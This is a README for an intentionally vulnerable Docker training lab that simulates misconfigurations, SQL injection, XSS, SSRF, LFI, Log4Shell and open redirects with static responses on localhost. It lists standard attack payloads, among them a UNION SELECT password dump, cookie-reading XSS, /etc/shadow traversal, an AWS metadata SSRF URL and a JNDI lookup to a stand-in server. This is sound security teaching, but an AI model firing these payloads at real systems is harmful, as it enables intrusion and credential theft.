# VulnLab – Docker Web Pentesting Training Environment

> ⚠️ **INTENTIONALLY VULNERABLE – FOR EDUCATIONAL USE ONLY**
>
> This lab is designed for security learning. All vulnerabilities are **simulated with static, hardcoded responses only**. No real files are read, no real commands are executed, and no external HTTP requests are made from the server. Bind only to `127.0.0.1` (localhost). **Never expose this lab to a public network.**

---

## 📋 Table of Contents

1. [Architecture](#architecture)
2. [Quick Start](#quick-start)
3. [Endpoint Reference](#endpoint-reference)
4. [Vulnerability Details](#vulnerability-details)
5. [Nuclei Scanning](#nuclei-scanning)
6. [Reset Instructions](#reset-instructions)
7. [Safety Constraints](#safety-constraints)
8. [Learning Objectives](#learning-objectives)

---

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│  Host Machine                                               │
│                                                             │
│   Browser → 127.0.0.1:8080 ──────────────────────────┐     │
│                                                       │     │
│   ┌───────────────────────────────────────────────────▼──┐  │
│   │  Docker Container (vulnlab)                          │  │
│   │                                                      │  │
│   │   Gunicorn (WSGI) → Flask (Python 3.12)              │  │
│   │   ├── Read-only FS       ├── No real DB              │  │
│   │   ├── Non-root user      ├── No external HTTP        │  │
│   │   ├── All caps dropped   ├── Static responses only   │  │
│   │   └── 256 MB / 0.5 CPU  └── tmpfs /tmp only         │  │
│   └──────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘

Network: Isolated Docker bridge (172.28.0.0/24)
Binding: 127.0.0.1:8080 ONLY
```

**Tech Stack:**
- App: Python 3.12 + Flask 3.x
- Server: Gunicorn (2 workers)
- Container: Docker / Docker Compose
- OS base: `python:3.12-slim` (Debian)

---

## Quick Start

### Prerequisites
- [Docker Desktop](https://www.docker.com/products/docker-desktop/) (Windows/Mac) or Docker Engine (Linux)
- Docker Compose v2+

### Start the Lab

```bash
# Navigate to the docker-lab directory
cd docker-lab

# Build and start (first time takes ~60 seconds)
docker compose up -d --build

# Check it's running
docker compose ps

# Open in browser
# → http://127.0.0.1:8080
```

### Stop the Lab

```bash
docker compose down
```

---

## Endpoint Reference

### Base URL: `http://127.0.0.1:8080`

| Method | Endpoint | Category | Vulnerability Simulated |
|--------|----------|----------|-------------------------|
| `GET` | `/` | - | Home / endpoint index |
| `GET` | `/.env` | Misconfiguration | Exposed environment file (DB_PASSWORD, AWS keys) |
| `GET` | `/.git/config` | Misconfiguration | Exposed git config with embedded credentials |
| `GET/POST` | `/admin` | Misconfiguration | Default credentials (`admin` / `admin123`) |
| `GET` | `/uploads/` | Misconfiguration | Directory listing enabled |
| `GET` | `/config.json` | Misconfiguration | Exposed API/DB config with secrets |
| `GET` | `/wp-plugin` | CVE Fingerprint | Vulnerable WP plugin version (CVE-2022-XXXX) |
| `GET` | `/log4j-test` | CVE Fingerprint | Log4Shell JNDI lookup error (CVE-2021-44228) |
| `ALL` | `*` (any page) | CVE Fingerprint | `X-Jenkins: 2.150` header on every response |
| `GET` | `/search?q=` | SQL Injection | Error-based SQLi on single-quote input |
| `GET` | `/echo?msg=` | XSS | Reflected XSS – unescaped parameter in DOM |
| `GET` | `/fetch?url=` | SSRF | AWS metadata SSRF simulation |
| `GET` | `/page?file=` | LFI | Path traversal → `/etc/passwd` simulation |
| `GET` | `/redirect?next=` | Open Redirect | Unvalidated redirect to any URL |
| `GET` | `/health` | Utility | Health check (used by Docker) |

---

## Vulnerability Details

### A. Misconfiguration Simulations

#### 1. `/.env` – Environment File Exposure
**Risk:** Critical  
**Payload:** `curl http://127.0.0.1:8080/.env`  
**Response contains:**
```
DB_PASSWORD=DUMMY_DB_PASS
AWS_SECRET_ACCESS_KEY=FAKE_SECRET_000
```
**Learning:** Developers often forget to add `.env` to `.gitignore` or block it from web-accessible directories. This is consistently in the OWASP Top 10 under *Security Misconfiguration*.

---

#### 2. `/.git/config` – Git Config Exposure
**Risk:** High  
**Payload:** `curl http://127.0.0.1:8080/.git/config`  
**Learning:** Deploying without removing the `.git` folder exposes remote URLs (sometimes with embedded credentials), branch names, and developer emails.

---

#### 3. `/admin` – Default Credentials
**Risk:** Critical  
**Payload:** POST `username=admin&password=admin123`  
**Learning:** Factory-default or well-known credentials are a top initial access vector in real attacks. Always force credential rotation.

---

#### 4. `/uploads/` – Directory Listing
**Risk:** Medium  
**Payload:** `curl http://127.0.0.1:8080/uploads/`  
**Learning:** `Options +Indexes` in Apache or missing `index.html` can expose all uploaded files. Attackers use this to find backup archives, database dumps, and private keys.

---

#### 5. `/config.json` – Exposed Configuration
**Risk:** Critical  
**Payload:** `curl http://127.0.0.1:8080/config.json`  
**Response contains:** `FAKE_API_KEY_12345`, Stripe keys, Slack webhook  
**Learning:** JSON config files should never be web-accessible; they belong outside the webroot or behind authentication.

---

### B. CVE Fingerprint Simulations

#### 1. `/wp-plugin` – Vulnerable Plugin Version Disclosure
**CVE:** CVE-2022-XXXX (simulated)  
**Payload:** `curl http://127.0.0.1:8080/wp-plugin`  
**Learning:** Version disclosure lets attackers look up known CVEs. Plugin version banners should always be suppressed in production.

---

#### 2. `/log4j-test` – Log4Shell JNDI Simulation
**CVE:** CVE-2021-44228 (CVSS 10.0)  
**Payload:**
```bash
curl -H 'X-Api-Version: ${jndi:ldap://dummy-server/a}' \
     http://127.0.0.1:8080/log4j-test
```
**Response:** Static error message referencing the JNDI lookup (not executed)  
**Learning:** Log4j 2.x before 2.17.1 evaluated JNDI expressions in log messages, allowing unauthenticated RCE. The lab shows what the error looks like without any real execution.

---

#### 3. `X-Jenkins: 2.150` Header
**Payload:** `curl -I http://127.0.0.1:8080/`  
**Learning:** Server headers leak middleware and version info. Security headers like `Server: ` should be stripped or replaced with generic values.

---

### C. Web Vulnerability Pattern Simulations

#### 1. `/search?q=` – SQL Injection (Error-Based)
**Risk:** Critical  
**Payloads:**
```
/search?q='
/search?q=' OR 1=1--
/search?q=' UNION SELECT null,username,password FROM users--
```
**Learning:** Unparameterised SQL queries allow attackers to manipulate query logic, dump databases, or bypass authentication.

---

#### 2. `/echo?msg=` – Reflected XSS
**Risk:** High  
**Payloads:**
```
/echo?msg=<script>alert('XSS')</script>
/echo?msg=<img src=x onerror=alert(document.cookie)>
/echo?msg=<svg onload=alert(1)>
```
**Learning:** Any user input reflected in HTML without encoding enables script injection. Use `html.escape()` or template auto-escaping.

---

#### 3. `/fetch?url=` – SSRF (Server-Side Request Forgery)
**Risk:** Critical  
**Payload:** `/fetch?url=http://169.254.169.254/latest/meta-data/`  
**Response:** Fake AWS metadata with `FAKE_INSTANCE_ID`, IAM credentials  
**Learning:** SSRF lets attackers make the server fetch internal resources — in cloud environments this means stealing IAM credentials from the metadata endpoint.

---

#### 4. `/page?file=` – Local File Inclusion (LFI)
**Risk:** High  
**Payloads:**
```
/page?file=../../../../etc/passwd
/page?file=/etc/shadow
/page?file=/proc/self/environ
```
**Response:** Fake `/etc/passwd` with dummy entries  
**Learning:** Directly including user-controlled file paths allows attackers to read sensitive files. Always use allowlists for file includes.

---

#### 5. `/redirect?next=` – Open Redirect
**Risk:** Medium  
**Payload:** `/redirect?next=https://evil.com/fake-login`  
**Response:** `302 Location: https://evil.com/fake-login`  
**Learning:** Unvalidated redirects are used in phishing campaigns. Victims see the trusted domain in the initial URL, but are redirected to a malicious site.

---

## Nuclei Scanning

All Nuclei templates are in [`nuclei-templates/`](./nuclei-templates/).

### Run All Lab Templates

```bash
# Against the running lab
nuclei -u http://127.0.0.1:8080 -t nuclei-templates/ -v

# With JSON output
nuclei -u http://127.0.0.1:8080 -t nuclei-templates/ -j -o results.json

# Run a specific template
nuclei -u http://127.0.0.1:8080 -t nuclei-templates/vulnlab-sqli.yaml
```

### Available Templates

| Template File | Detects |
|---------------|---------|
| `vulnlab-env-exposure.yaml` | `.env` with `FAKE_SECRET_000` / `DUMMY_DB_PASS` |
| `vulnlab-git-config.yaml` | `.git/config` with embedded dummy credentials |
| `vulnlab-default-creds.yaml` | POST `admin:admin123` → access granted |
| `vulnlab-sqli.yaml` | SQL syntax error on `'` injection |
| `vulnlab-xss.yaml` | Script tag reflected unescaped in `/echo` |
| `vulnlab-ssrf.yaml` | AWS metadata response from `/fetch` |
| `vulnlab-lfi.yaml` | `/etc/passwd` dummy content from `/page` |
| `vulnlab-cve-fingerprints.yaml` | `X-Jenkins` header, plugin CVE, Log4Shell error |
| `vulnlab-open-redirect.yaml` | 302 to attacker-controlled URL |

---

## Reset Instructions

### Windows (CMD / PowerShell)
```cmd
cd docker-lab

# Soft reset (fastest – just restart container, clears in-memory state)
reset.bat

# Hard reset (stop → delete image → rebuild → start fresh)
reset.bat hard
```

### Linux / macOS / WSL
```bash
cd docker-lab
chmod +x reset.sh

# Soft reset
./reset.sh

# Hard reset
./reset.sh --hard
```

### Manual Docker Commands
```bash
# Soft restart
docker compose restart vulnlab

# Stop completely
docker compose down

# Full rebuild
docker compose down --rmi local --volumes --remove-orphans
docker compose up -d --build

# View logs
docker compose logs -f vulnlab

# Open shell inside container (for inspection)
docker compose exec vulnlab sh
```

---

## Safety Constraints

| Constraint | Implementation |
|-----------|----------------|
| **Localhost only** | `ports: "127.0.0.1:8080:8080"` in docker-compose |
| **No real file reads** | All responses are hardcoded Python strings |
| **No real RCE** | No `subprocess`, `os.system`, or `eval` calls |
| **No real HTTP requests** | No `requests`, `urllib` calls to external hosts |
| **No real DB** | No database: all data is in-memory constants |
| **Read-only FS** | `read_only: true` in docker-compose |
| **Non-root user** | UID 1001 `appuser` in Dockerfile |
| **All caps dropped** | `cap_drop: [ALL]` in docker-compose |
| **Resource limits** | 256 MB RAM, 0.5 CPU |
| **No new privileges** | `no-new-privileges: true` |
| **Dummy secrets** | All secrets use `FAKE_*` / `DUMMY_*` prefixes |

---

## Learning Objectives

After working through this lab, students should be able to:

1. **Reconnaissance**: Discover exposed sensitive files (`.env`, `.git`, config)
2. **Fingerprinting**: Identify software versions from headers and responses
3. **SQL Injection**: Recognise error-based injection and basic payloads
4. **XSS**: Craft and deliver reflected XSS payloads
5. **SSRF**: Understand cloud metadata theft via SSRF
6. **LFI**: Perform path traversal to read system files
7. **Logic Flaws**: Exploit open redirects and default credentials
8. **Automated Scanning**: Write and run Nuclei templates against a target

---

## File Structure

```
docker-lab/
├── Dockerfile                    # Container build instructions
├── docker-compose.yml            # Orchestration with safety constraints
├── reset.sh                      # Reset script (Linux/macOS/WSL)
├── reset.bat                     # Reset script (Windows)
├── README.md                     # This file
├── app/
│   ├── app.py                    # Flask application (all vulnerabilities)
│   └── requirements.txt          # Python dependencies
└── nuclei-templates/
    ├── vulnlab-env-exposure.yaml
    ├── vulnlab-git-config.yaml
    ├── vulnlab-default-creds.yaml
    ├── vulnlab-sqli.yaml
    ├── vulnlab-xss.yaml
    ├── vulnlab-ssrf.yaml
    ├── vulnlab-lfi.yaml
    ├── vulnlab-cve-fingerprints.yaml
    └── vulnlab-open-redirect.yaml
```

---

> **Disclaimer:** This lab is provided for educational purposes only. The authors are not responsible for any misuse. Do not deploy this application on a public network or use these techniques against systems you do not own.
